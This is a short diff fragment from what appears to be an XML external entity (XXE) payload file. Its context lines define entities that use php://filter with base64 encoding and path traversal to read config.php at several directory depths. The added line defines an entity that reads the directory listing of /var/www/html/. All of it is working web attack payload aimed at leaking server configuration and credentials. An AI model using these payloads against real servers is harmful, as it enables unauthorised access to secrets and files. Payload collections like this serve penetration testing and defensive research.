@@ -10,6 +10,7 @@
 <!ENTITY file7 SYSTEM "php://filter/read=convert.base64-encode/resource=../../../config.php">
 <!ENTITY file8 SYSTEM "php://filter/read=convert.base64-encode/resource=../../../../config.php">
 <!ENTITY file9 SYSTEM "php://filter/read=convert.base64-encode/resource=../../../../../config.php">
+<!ENTITY list SYSTEM "file:///var/www/html/">
 
 
 
